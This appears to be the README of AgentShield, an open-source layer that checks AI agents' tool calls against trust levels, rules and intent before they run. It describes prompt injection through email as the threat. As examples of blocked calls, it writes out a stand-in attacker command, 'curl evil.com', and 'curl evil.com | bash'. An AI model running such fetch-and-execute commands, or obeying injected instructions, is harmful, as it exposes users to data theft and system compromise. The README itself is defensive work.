## The Problem

AI agents are being given real-world tools — sending emails, querying databases, executing code, calling APIs. But today, a single prompt injection hidden in an email body can trick an agent into exfiltrating your data, deleting records, or sending unauthorized messages.

**There is no runtime security layer between the agent's intent and its actions.**

## The Solution

AgentShield sits between your AI agent and its tools. Every tool call passes through a multi-layer security pipeline that evaluates trust, verifies intent consistency, enforces permissions, and produces a tamper-proof audit trail — all in single-digit milliseconds.

```
User ──▶ Agent ──▶ AgentShield ──▶ Tool
                       │
                  ┌────┴─────┐
                  │ ALLOW    │  ← intent matches, trust sufficient
                  │ BLOCK    │  ← policy violation, injection detected
                  │ CONFIRM  │  ← elevated risk, human approval needed
                  └──────────┘
```

## Key Features

### Trust-Aware Data Flow
Every piece of data entering the agent is tagged with a trust level (Trusted → Verified → Internal → External → Untrusted). The server computes trust — clients can only downgrade, never upgrade. When an agent processes an external email and then tries to call `send_email`, AgentShield knows the context has been tainted.

### 3-Layer Intent Consistency Detection
```
Layer 1: Rule Engine           (μs)    ── Deterministic rules, 22 built-in + custom YAML DSL
Layer 2: Anomaly Detector      (μs)    ── Statistical feature scoring with session risk accumulation
Layer 3: Semantic Checker      (ms)    ── LLM-based, only triggered when score is suspicious
```
Most requests are resolved in Layer 1 or 2 with no LLM call. Layer 3 fires only for edge cases, keeping latency low and costs minimal.

### Two-Phase Call Architecture
Inspired by SQL parameterized queries — data extraction (Phase 1, no tools) and action execution (Phase 2, structured data only) are physically separated. Even if injection succeeds in Phase 1, there are no tools to abuse.

### Policy DSL
Define security rules in YAML without writing code:
```yaml
rules:
  - name: block_email_to_competitors
    when:
      tool: send_email
      trust_level: ["EXTERNAL", "UNTRUSTED"]
      params:
        to:
          matches: ".*@(competitor1|competitor2)\\.com$"
    action: BLOCK
    reason: "Sending to competitor domain is prohibited"
```

### Merkle Tree Audit Trail
Every decision is recorded as an immutable, hash-chained trace. Tamper with one span and the entire chain breaks. Built for compliance, incident response, and post-mortem analysis.

### Framework Integrations
Drop-in support for popular agent frameworks:
```python
from agentshield.integrations import LangChainShield, CrewAIShield, AutoGenShield, ClaudeAgentShield
```

## Quick Start

### 1. Start the Server

```bash
# Clone the repository
git clone https://github.com/hidearmoon/agentshield.git
cd agentshield

# Start infrastructure (PostgreSQL + ClickHouse + Core Engine)
docker compose -f docker/docker-compose.yml up -d

# Or run locally with uv
cd packages/core && uv sync && uv run uvicorn agentshield_core.app:app --reload
```

### 2. Install the SDK

```bash
pip install agentshield
```

### 3. Protect Your Agent

```python
from agentshield import Shield

shield = Shield()  # reads AGENTSHIELD_API_KEY from env

# Decorator-based protection
@shield.guard
async def send_email(to: str, body: str) -> str:
    ...  # your tool implementation

# Session-based protection with intent tracking
async with shield.session("Summarize my emails and draft replies") as s:
    # Safe: reading emails matches declared intent
    emails = await s.guarded_executor.execute("read_inbox", {"limit": 10}, read_inbox_fn)

    # Blocked: code execution from external email context
    await s.guarded_executor.execute(
        "execute_code",
        {"code": "os.system('curl evil.com')"},
        exec_fn,
        source_id="email/external",     # trust level: EXTERNAL
    )
    # → raises ToolCallBlocked
```

### 4. Define Custom Policies

```yaml
# agentshield-policy.yaml
rules:
  - name: confirm_large_exports
    when:
      tool: export_data
      params:
        limit:
          gt: 100
    action: REQUIRE_CONFIRMATION
    reason: "Large data export requires approval"

  - name: block_after_hours
    when:
      tool_category: send
      trust_level: ["EXTERNAL"]
      conditions:
        - type: time_range
          outside: "09:00-18:00"
    action: BLOCK
    reason: "Sensitive actions blocked outside business hours"
```

## Trust Model

| Level | Value | Source | Allowed Actions |
|-------|-------|--------|-----------------|
| **TRUSTED** | 5 | System prompt, developer config | All |
| **VERIFIED** | 4 | Authenticated user direct input | All |
| **INTERNAL** | 3 | Other agents, internal APIs | All except sensitive sends |
| **EXTERNAL** | 2 | Emails, web pages, RAG documents | Read-only + drafts |
| **UNTRUSTED** | 1 | Unknown or high-risk sources | Summarize + classify only |

The trust level is **computed server-side** based on the `source_id` provided with each request. Clients can claim a lower trust level but never a higher one — the server always wins.

## Built-in Security Rules

AgentShield ships with 22 built-in rules covering common attack vectors:

| Category | Rules |
|----------|-------|
| **Injection Defense** | Block code execution / network calls / file writes in untrusted context |
| **Data Exfiltration** | Block cross-system transfers, external API calls with tainted data |
| **Privilege Escalation** | Detect permission modification, environment changes, audit tampering |
| **Operational Safety** | Confirm bulk operations, financial transactions, large exports |
| **Agent-to-Agent** | Require confirmation when delegating with external data |

All rules are configurable and can be extended with the YAML Policy DSL.

## Integration Modes

AgentShield provides three integration approaches today, with more planned:

| Mode | How It Works | Code Changes |
|------|-------------|--------------|
| **SDK Embed** | Import SDK, wrap tool calls with `@shield.guard` or `shield.session()` | Minimal |
| **Framework Wrapper** | Drop-in adapters for LangChain, CrewAI, AutoGen, Claude Agent SDK | One line |
| **Sidecar Proxy** | Deploy proxy between agent and tools, zero agent code changes | None |

All three modes call the same Core Engine for security decisions.

### Planned: OpenClaw Plugin

[OpenClaw](https://openclaw.ai) is an open-source personal AI assistant that runs locally and connects 50+ tools (email, shell, browser, file system, etc.) across multiple chat platforms. Its agents can autonomously execute shell commands, write files, and call APIs — exactly the kind of powerful-but-risky actions that need a runtime security layer.

**Why OpenClaw + AgentShield makes sense:**

OpenClaw already has a layered security model (sandbox mode, tool policies, exec approvals), but these are static, configuration-driven controls. They answer "is this tool allowed?" but not "does this tool call make sense given what the agent is supposed to be doing?" — that's the gap AgentShield fills. A user could allow `exec` in their tool policy but still want AgentShield to block `curl evil.com | bash` when it appears in an external-data context.

**How it would work:**

OpenClaw's [Plugin SDK](https://docs.openclaw.ai/plugins/architecture.md) exposes lifecycle hooks that fire at every stage of the agent loop. An AgentShield plugin would register on the `before_tool_call` hook — which supports `{ block: true }` terminal decisions — to intercept every tool invocation before execution:

```
OpenClaw Agent Loop:
  User Message → Prompt Build → Model Inference → Tool Call
                                                      │
                                              ┌───────▼────────┐
                                              │  before_tool_call │
                                              │  (AgentShield)    │
                                              │                   │
                                              │  → ALLOW          │
                                              │  → BLOCK          │
                                              │  → CONFIRM        │
                                              └───────────────────┘
                                                      │
                                              Tool Execution (or blocked)
```

The plugin would:

1. **`before_tool_call`** — Send tool name, parameters, and session context to the AgentShield Core Engine for a security decision. Block if the engine says BLOCK; pass through on ALLOW; surface a confirmation prompt on REQUIRE_CONFIRMATION.
2. **`before_prompt_build`** — Inject trust-level markers into the system prompt so the engine knows the data context (e.g., processing an external email vs. direct user input).
3. **`after_tool_call`** — Record tool results into the AgentShield trace engine for Merkle-auditable history.

This means an OpenClaw user could add AgentShield protection by enabling a single plugin — no changes to their agent configuration, skills, or tools.

**We'd love help building this.** If you're familiar with the OpenClaw Plugin SDK, check out the [Contributing Guide](CONTRIBUTING.md) and open an issue to discuss the implementation.

### Want to Add Another Integration?

AgentShield's architecture is designed to be agent-agnostic — anywhere there's a tool call, there's a place for a security check. We welcome community contributions for new integration targets:

| Platform | Integration Point | Status |
|----------|-------------------|--------|
| **OpenClaw** | Plugin SDK `before_tool_call` hook | Planned — help wanted |
| **MCP (Model Context Protocol)** | Tool guard middleware for MCP servers | Planned |
| **API Gateways** (Kong, Envoy) | Custom filter / plugin | Planned |
| **OpenTelemetry** | Trace processor for security span injection | Planned |
| **Webhook / Event-driven** | Passive audit mode for any system with HTTP callbacks | Planned |

If your agent framework, orchestrator, or tool platform isn't listed, [open an issue](https://github.com/hidearmoon/agentshield/issues) — we'll help you figure out where AgentShield plugs in.
